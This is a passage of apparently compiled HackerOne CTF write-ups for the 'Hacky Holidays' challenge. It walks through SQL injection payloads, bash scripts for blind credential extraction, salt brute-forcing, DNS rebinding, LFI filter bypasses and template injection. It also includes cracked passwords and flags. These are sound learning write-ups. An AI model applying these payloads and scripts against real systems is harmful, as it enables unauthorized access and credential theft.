2'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
3...
4$line .= str_pad( $age,3,"#");
5...
6$age = intval($_POST["age"]);
7...
What we can notice is that the code is trusting whatever is coming from the browser. In the case of age it accepts on 3 characters and then passes it to intval() that allows the input to be converted to a integer and get stored in the database (users.txt).
Format of users.txt
Code 395 Bytes
1$random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
2$line = '';
3$line .= str_pad( $username,15,"#");
4$line .= $password;
5$line .= $random_hash;
6$line .= str_pad( $age,3,"#");
7$line .= str_pad( $firstname,15,"#");
8$line .= str_pad( $lastname,15,"#");
9$line .= 'N';
10$line = substr($line,0,113);
11file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
It stores data in users.txt as
It stores username, firstname, and lastname with 15 characters padding, that means cannot allow more than 15 characters.
2 md5 hash → password and random_hash = 64 characters
age - 3 characters padding, cannot allow more than 3 characters
and at the last it appends one character N.
Total character count = 113 and at last it substr() it to extract characters from 0 to 113.
According to the README.md, if a record in users.txt has Y at it's end, it becomes an admin user. There is not much we can tinker with, we can just use age to our advantage.
Methodology
To become admin, we need to omit out N in from the record, and put Y in place of that, we can use age and lastname to our advantage and get access.
Since we know, whatever value we pass in age get into intval() which makes the string as integer. So, what if we can pass 4 characters from age and put last character of lastname as Y. We are ADMIN!
To do that, we can intercept the request, change the age value to 1e3 which later passed in intval() outputs 1000 [4 characters] - it omits the N and pass the lastname's last character as Y.
<image_20>
It creates an user successfully and we can login to get the flag.
<image_21>
Flag 11 - Grinch Recon
Objective - Get Access to the Attack Box
URL: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/
<image_22>
<image_23>
Image URL: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
Which consists of base64 data's value, which when decoded, gives and image path and auth token.
Code 306 Bytes
1# Album Hash: jdh34k
2eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9 
3=> {"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
With initial unsuccessful attempts for de-hashing the auth hash and trying to change the image path, moved ahead for further enumeration and struggling to find some vulnerability, a hint was dropped and I was like "NOT AGAIN!"
<image_24>
It then hit me that it might be SQLi-inception similar to the previous challenge I solved in the last CTF. But this time it was frustrating as hell. Let's see how was it!
Possible SQLi endpoints were album parameter and data parameter, but the data parameter felt very unlikely. Therefore, trying to find an SQLi on album for some time yield 404 and I was supper happy and annoyed at the same time 😂 and the payload that worked for me was:
Code 62 Bytes
1.../r3c0n_server_4fdk59/album?hash=-1' union select 1,2,3 -- -
And at this point '3' got output on the screen to I decided to further enumerate the database.
database - recon
tables
album
id
hash
name
photo
id
album_id
photo
album
id
hash
name
id
hash
name
photo
id
album_id
photo
id
album_id
photo
And reading the data inside the tables, gave an idea of how things are stored in the database. While enumerating the photo table
Code 150 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-1' UNION ALL SELECT 1, 2, group_concat(album_id,",",id,",",photo,";\n") from photo-- -
<image_25>
The image names are stored in the database and as we have seen in the base64 decoded JSON, it's the path.
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
Basically what it does is, takes the name and adds the other part to it and then generate an auth token for it. Therefore, we have to make the application generate an auth token for the any path that we want to visit
Playing with other parameters, we came to know that the 1st parameter takes the album_id that takes the photo and appends it to the path (r3c0n_server_4fdk59/uploads/{filename}) and renders it on the website.
We don't have access to the /api endpoint directly, so we can pass the path in the SQL query that will provide us access to the /api/ endpoint. Let's see how:
Code 119 Bytes
1.../r3c0n_server_4fdk59/album?hash="-1' UNION ALL SELECT "-1' union all select NULL,NULL,'../api/endpoint'-- -",2,3-- -
This rendered a broken image on the site, and visiting the image URL: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2VuZHBvaW50IiwiYXV0aCI6IjliYzdkOWFhOTRlZTZkNTQyZGYyYzNjZWZjYWRlNjgxIn0= gave a custom error message - Expected HTTP status 200, Received: 404
And according to the API documentation it was an invalid endpoint.
<image_26>
Now, what we have to do is to find a valid endpoint and in order to do that, it is a 3 step process.
Bruteforce with a wordlist.
For each word, check the response
And if the response if not Expected HTTP status 200, Received: 404, we get a hit.
So, to achieve that we had to do a bit of scripting,
Code 618 Bytes
1#!/bin/bash
2# find_endpoints.sh : Script for finding the valid endpoint
3# Usage: cat wordlist.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
4
5word=$1
6
7url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/${word}'--%20-%22,2,3--%20-"
8
9# extracting image path
10path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)
11
12img_url="https://hackyholidays.h1ctf.com${path}"
13
14if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 404" ]]; then 
15        echo "${word}:${img_url}"
16fi
And looping this script through the common.txt gave us two hits,
Code 470 Bytes
1$ cat common.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
2user:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==
3ping:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3BpbmciLCJhdXRoIjoiOTMzZTJkMzk5NWE4MmIzZmQyODE1NWQyMjg3MDk1M2YifQ==
user and ping(a rabbit hole -.-) , user/ seems to be interesting, so we can continue to enumerate on that, we can make few tweaks on the previous scripts to bruteforce for parameters, if we try for some random parameter with some random value, it gives us an error - Expected HTTP status 200, Received: 400 i.e. Invalid GET/POST request. So, we can use this error message to enumerate on the parameter (FUZZ?=anything)
Code 619 Bytes
1#!/bin/bash
2# find_endpoints.sh : Script for finding the valid endpoint
3# Usage: cat wordlist.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
4
5url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/?${word}=anything'--%20-%22,2,3--%20-"
6
7# extracting image path
8path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)
9
10img_url="https://hackyholidays.h1ctf.com${path}"
11
12if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 400" ]]; then 
13        echo "${word}:${img_url}"
14fi
And looping over the script gave, two parameters username and password.
Code 525 Bytes
1$ cat test.txt  | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
2username:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9YW55dGhpbmciLCJhdXRoIjoiZTkwN2ZmZTJiZDFjYTc1YmI5ODliYjFkYTZiYTAwNDAifQ==
3password:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/cGFzc3dvcmQ9YW55dGhpbmciLCJhdXRoIjoiNWI1MGQ3MTVjZjYyYmRmYjY4ZWQ1ZGQ1YzU3ZDBkMDgifQ==
Now that we have username and password parameters we can starting looking for it's values, to check for any error message we try - user?username=a to get Expected HTTP status 200, Received: 204. Now we know what to negate to. But how is this searching in database? Theory:
Code 133 Bytes
1select * from user where username like "whatever";
2select * from user where username like "w%"; # if we don't know the complete thing
So, if we have to guess character by character we have to use wild card characters - % allows all the character, so we can use it like - a% to check if a is the first character or not. To do it manually, it will be too much of work, so let's script it out,
Code 1.90 KiB
1#!/bin/bash
2# find_credentials.sh: Script for finding the valid credentials
3
4charset=$(echo {a..z} {A..Z} {0..9})
5
6# Extracting Username
7ct=0
8found=""
9res=""
10echo "[*] Finding Username..."
11while [[ $ct -le 36 ]]; do
12        ct=0
13        for char in $charset
14        do
15                url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/user?username=${found}${char}%'--%20-%22,2,3--%20-"
16
17                # extracting image path
18                path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)
19
20                img_url="https://hackyholidays.h1ctf.com${path}"
21                if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 204" ]]; then 
22                        echo ${char}
23                        res=$res$char
24                        found=${found}${char}
25                        break 1
26                fi
27                ct=$(( ct+1 ))
28        done
29done
30echo "Username: ${res}"
31
32# Extracting Password
33ct=0
34found="s"
35echo "[*] Finding Password..."
36while [[ $ct -le 62 ]]; do
37        ct=0
38        for char in $charset
39        do
40                url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,%27../api/user?password=${found}${char}%%27--%20-%22,2,3--%20-"
41
42                # extracting image path
43                path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)
44
45                img_url="https://hackyholidays.h1ctf.com${path}"
46                if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 204" ]]; then 
47                        echo ${char}
48                        found=${found}${char}
49                        break 1
50                fi
51                ct=$(( ct+1 ))
52        done
53done
54echo "Password: ${found}"
55echo "Done!"
Yields:
Code 42 Bytes
1Username: grinchadmin
2Password: s4nt4sucks
<image_27>
Flag 12 - The End Game - "Attack Server"
Objective - Stop the DDOS Attack.
<image_28>
When we try to launch the attack, what it does is it passes a payload as a GET request, and then that URL is redirected to another to open up a web based terminal which pings the IP of the Santa's Server.
Code 130 Bytes
1https://.../attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
When we decode the payload it decodes to,
Code 67 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
Upon playing with the payload, a few things came to attention,
The IP cannot be changed directly, without changing the hash
There is validation of IP format and only accepts [a-z][A-Z][0-9].
So, we have to create a hash for the IP that we want to ping.
If we want to stop the Grinch, what we need to do is take down the services of the network, so in order to do that, we can ping flood the Grinch's server.
So, let's see how we can break down the parts and solve each one of them.
Make a way to ping any other IP.
In order to ping some IP we have to provide a protection hash along with it, in the base64 encoded payload. We have to find out a way to generate such hashes.
Passing the hash through crackstation gave nothing useful, so the hash must be having salt in it. So, what we can do is try to guess the salt, but what else the hash is containing - rough guess - it's the IP associated with the hash in the payload.
After guessing and trying out combinations for sometime, it was evident that the hash is generated as concatenation of salt and IP.
A small script to bruteforce for the salt, would do the work
Code 436 Bytes
1# get_salt.py - finds salt of the hash by bruteforcing using rockyou.txt.
2# Usage: python get_salt.py rockyou.txt
3import sys, hashlib
4
5file_path = sys.argv[1]
6with open(file_path,'r', errors='replace') as f:
7    words = f.readlines()
8
9for word in words:
10    result = word.strip()+'203.0.113.33'
11    result = hashlib.md5(result.encode())
12
13    if result.hexdigest() == "5f2940d65ca4140cc18d0878bc398955":
14        print(word)
15        break
So, it yields out the salt
Code 11 Bytes
1mrgrinch463
Now, we have the salt, so we can use it to regenerate the hash for any IP that we want.
Code 15 Bytes
1mrgrinch463<IP>
<image_29>
So, it does not allows, us to ping directly, so we have to find some different way, it basically works in three step process
Input the URL - it then resolves with DNS
Checks if the resolved IP is not equal to 127.0.0.1
If true, it continues to ping the URL
So, we have to first pass the check and then use it. This can be done using DNS Rebinding (TOCTOU - Time of Check. Time of Use Vulnerability)
Implements the DNS Rebinding using concept from this GitHub repo - https://github.com/taviso/rbndr
Code 26 Bytes
17f000001.c0a80001.rbndr.us
The above mentioned URL will help in easy switch between the two IPs implemented in hex.
7f000001 - 127.0.0.1
c0a80001 - 192.168.0.1
So, when we ping the above URL, it resolves to 192.168.0.1 or 127.0.0.1, as the server randomly returns one of the addresses.
So, with a bit of luck and several tries by crafting a payload as below,
Code 191 Bytes
1{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}
2
3eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
<image_30>
Thanks to Adam Langley and team for putting up such an awesome CTF. It was a great learning experience. :)
Impact
The attacker was able to stop the DDOS Attack on Santa's Servers.



==================================================

Report File: 1067912.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Access Control - Generic

Contents:

Foreword
This was an amazing CTF! The first from Hackerone that I've finished and one that I have enjoyed the most. Huge shout out to @adamtlangley for creating this downright poetic challenge. My whopping 20+ invitations are already being put to good use. Hacky Holidays and Merry Hackmas!
Flag #1 - robots.txt
'Twas the night before Hackmas, when all through the net
Not a feature was deployed, not even password reset
The flag was placed in robots.txt with care
In hopes that hackers might first look there
A classic! The first flag was nestled in robots.txt, the first place any good hacker or CTFer might look for clues.
<image_0>
Flag #2 - s3cr3t-ar3a
The flag was nestled all snug in jQuery
While hackers attempted all of their theories
I put on my hoodie, my knuckles I cracked
"I bet I could just right click inspect that"
Going off of Flag 1, the second flag had to be hidden in /s3cr3t-ar3a. The source of the page didn't reveal anything interesting. The only thing on the page that looked remotely interesting was the jQuery file hosted locally.
<script src="/assets/js/jquery.min.js"></script>
The version of jQuery used was jQuery v3.5.1 so I decided to run it through a diff checker online to see if any custom code had been added.
<image_1>
Aha! There's a difference! the code clearly looks like it's being used to add a flag to an attribute of an element called alertbox which is likely on the /s3cr3t-ar3a page.
Code 349 Bytes
1h1_0 = 'la', h1_1 = '}', h1_2 = '', h1_3 = 'f', h1_4 = 'g', h1_5 = '{b7ebcb75', h1_6 = '8454-', h1_7 = 'cfb9574459f7', h1_8 = '-9100-4f91-';
2document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
3document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
Rather than reverse engineer this obfuscated code, we can just inspect the alertbox element! Gotta love a flag hidden in plain sight.
<image_2>
Flag #3 - People Rater
Then out in the /apps, there arose a new feature
a people rater? Man, what could be neater?
Away to Burp Suite, I flew like a flash
Tore open the base64, and found Grinch's stash
The Grinch rears his ugly head and tells us how he really feels about the Whos down in Whoville! (spoiler: not great)
When a name is clicked, the site retrieves the associated rating with a base64 string:
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6M30=
That id decoded is: {"id":3}
Looking for something interesting, I decided to try changing the id value to 1, re-encoding, and sending it back to the server - revealing the flag!
The Grinch's heart may be capable of growth but his ego will never shrink.
<image_3>
Flag #4 - Swag Shop
The endpoints on the API of the shop full of swag
Gave an idea I might not have otherwise had,
When what to my wondering eyes did appear,
But the Grinch's PII and address right here!
Clicking around the swag shop didn't bring up any obvious leads. However, there was an API directory with a few endpoints (stock purchase and login) which made me think there may be a few more.
I fired up a directory brute force using dirsearch.py and quickly identified two interesting API endpoints sessions and user
<image_4>
The sessions endpoint was leaking some juicy data:
Code 2.14 KiB
1{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
Session #2 appeared different and piqued my interested. Here it is base64 decoded:
Code 238 Bytes
1{
2  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
4}
We now have a user ID of sorts (is this Adam's old Windows XP key?) and a cookie. I attempted a few session hijacking attacks using the user and cookie values to no avail. I then took another look at the user endpoint.
Code 35 Bytes
1{"error":"Missing required fields"}
I wasn't sure what those required fields would be, so I started a Param Miner attack in burp to guess query parameters that might be used. The parameter uuid popped up and returned a slightly different error message:
Code 40 Bytes
1{"error":"Could not find matching uuid"}
The value of "user" we found on the sessions endpoint looked a lot like a UUID... let's try passing it in here!
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
Code 260 Bytes
1{
2  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3  "username": "grinch",
4  "address": {
5    "line_1": "The Grinch",
6    "line_2": "The Cave",
7    "line_3": "Mount Crumpit",
8    "line_4": "Whoville"
9  },
10  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
11}
Looks like we doxxed the Grinch 😎
Flag #5 - Secure Login
With a little old login and nothing to click,
I knew in a moment we must brute force it.
More rapid than eagles my Intruder's words came
As I analyzed responses to deduce the username
This challenge looked pretty bare bones. Nothing interesting on the page, nothing found in a directory brute force. However, the error message received after a failed login suggested we could enumerate usernames! Instead of a generic error, the page tells us that our specific username is invalid. 'grinch' and 'admin' didn't work so it looked like brute forcing was the only option.
I started an intruder attack with a list of common names as payloads and extracted the error messages to see which user had a valid login. The username access popped up quickly - which avoided the need to continue sending off an additional 10k requests!
<image_5>
Using a "top 100" password list, I set up the same attack to brute force the password and log in:
<image_6>
So now I could log in with the credentials access/computer ... but there were no files to download :( However! The base64 session token after logging in appeared to contain a JSON object:
Code 59 Bytes
1{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
Life's better as an admin, so I flipped false to true, re-encoded, and changed the value of the securelogin cookie. After refreshing the page a zip file containing "secure" files showed up.
<image_7>
Given the brute-forcey nature of this challenge so far, it was time to guess the password! Kali Linux is preloaded with John the Ripper, a hash cracking tool. JTR is also bundled with a handy binary called zip2john which takes a password protected zip file and extracts the hash in a format usable by John the Ripper.
All that was left was to crack the hash with john hash.txt which revealed the password was hahahaha
Using the password to unzip the file gave the flag and xxx.png.... which is a lewd nude of a green dude
<image_8>
Flag #6 - My Diary
No root! No admin! Only ere privileged hackers
Exploiting code from developer slackers.
Embed the payload to make off with a haul!
Now str_replace! str_replace! str_replace all!
Judging by the URL: https://hackyholidays.h1ctf.com/my-diary/?template=entries.html
...this immediately looked like an LFI challenge. I quickly found that entries.html existed here: https://hackyholidays.h1ctf.com/my-diary/entries.html
I ran a quick fuzz using dirsearch and found that index.php existed in the same directory:
https://hackyholidays.h1ctf.com/my-diary/index.php
I then accessed index.php as a template - https://hackyholidays.h1ctf.com/my-diary/?template=index.php - which revealed the following source code:
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
We can see the fake admin page and the "secretadmin" pages here and the protections in place to avoid access to them.
Trying to access admin.php returns a 404, as expected since the page has moved.
Trying to access secretadmin.php states "You cannot view this page from your IP Address"
Looking deeper into the code, the str_replace function reminds me of a few XSS filters I've defeated in the past with the classic <scr<script>ipt>
Because the value of template is only looking for the values "admin.php" and "secretadmin.php" anywhere in the string and replacing them with empty text, a payload can be crafted to defeat the protection
secretadsecretadmiadmin.phpn.phpmin.php
On pass one, the new value of page is secretadsecretadmin.phpmin.php with admin.php removed
One pass two, the final value of page is secretadmin.php with secretadmin.php removed. This allows us to dump the contents of secretadmin.php and retrieve the flag:
<image_9>
Uh oh... the Grinch is planning to DDoS Santa's Workshop?? I knew this guy was trouble but THIS??? Thankfully we've intercepted this intel in time to save Christmas!
Flag #7 - Hate Mail Generator
Whether Bob or Alice, the Grinch hates them both
"Stinking, rotten, abominable!" he quoth
Seething with ire, the Grinch routes his mail
while hackers inject templates to prevail!
The Grinch loves sending the worst mail huh? (Jury duty, jury duty, jury duty, blackmail, pink slip, chain letter, eviction notice). Much like the Grinch loves injecting hate mail into our inboxes, we too must inject templates to... save Christmas!
The one sample piece of hate mail we have to work with shows us the format and the syntax {{template:file.html}}:
<image_10>
It looks like files can be included as templates. In order to find the file location, I ran dirsearch.py to find hidden directories. This revealed the templates folder and an admin template file! Let's come back to that later, since direct navigation returns a 403 Forbidden error.
<image_11>
When writing a new campaign you can either "Create" or "Preview" it.
<image_12>
We can't create a campaign because we're "out of credits" but we can submit a preview. Here's what that request looks like:
Code 262 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
4...
5
6preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
The preview syntax appears to be slightly different from the sample campaign. Let's try a few things and see if we can access 38dhs_admins_only_header.html
Code 304 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
4...
5
6preview_markup=Hello+{{name}}{{template:38dhs_admins_only_header.html}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
Response: You do not have access to the file 38dhs_admins_only_header.html dangit!
Taking another look at the preview_data parameter tells us that Alice replaces {{name}}. Let's try the same injection but abstracted by a step:
Code 304 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
4...
5
6preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
<image_13>
Looks like there's a new sheriff Grinch Network Admin in town.
Flag #8 - Forum
He was covered in green fur, from his head to his foot
Hood up and hacking, Santa's DDoS was afoot!
The Grinch's secret post laid bare the attack
We've got to keep cracking and get him right back!
This flag was tricky! An inital brute force of the forum app revealed the phpmyadmin login endpoint
<image_14>
No amount of fuzzing, bruteforcing, or otherwise hammering the app seemed to yield any results. That's when I decided to check twitter to see if I could get some direction.
https://twitter.com/JoeMilian1/status/1340297608699457536
Looks like the creator of this devious challenge was Adam! I quickly found a personal site, and a github account. I checked his latest commit which was on the following repo:
https://github.com/Grinch-Networks/forum
<image_15>
Now we're getting somewhere! All the code related to this forum appeared fairly locked down. I didn't find anything that jumped out at as usable on my first pass. I later noticed that 4 commits had been made to this repo and decided to dig deeper into those to look for secrets.
https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
<image_16>
In a commit called "Small fix" we can see that Adam removed a database connection credential which we can view in plain text! Trying this cred on the phpmyadmin endpoint gets us to the next step.
<image_17>
grinch appears to be the admin user, so lets try cracking his password! A quick check on crackstation.net reveals that the password is BahHumbug. Now we can login to the form as grinch and read his secret plans!
<image_18>
Uh oh, the Grinch is getting closer to launch his attack! We can't stop now! and I'm starting to think this "Adam" guy might be working with him...
Flag #9 - Evil Quiz
His eyes lurid yellow, like a black cat at night
His smile a gnarled root, a downright good fright!
His mind filled with evil, tricks, and malaise
Made this SQLi challenge go on for days
The difficulty really began to ramp up with this challenge. I first thought there was going to be a blind XSS element with the name being reflected after the quiz. But I started to notice that different names had different number of players who also used the same name. Using "grinch" as a name told me
There is 14 other player(s) with the same name as you!
I started to imagine what SQL query might retrieve that information:
Code 52 Bytes
1SELECT count(*) FROM sessions WHERE name = 'grinch';
I changed my name to grinch' AND 1=1;--, completed the quiz... and got the same response!
<image_19>
I then changed my name to grinch' AND 1=2;--, completed the quiz, and was told that there were 0 other players with my name. Se we now had a blind SQLi attack and a 1 byte difference -- 14 vs 0 -- that we could use for our boolean checks.
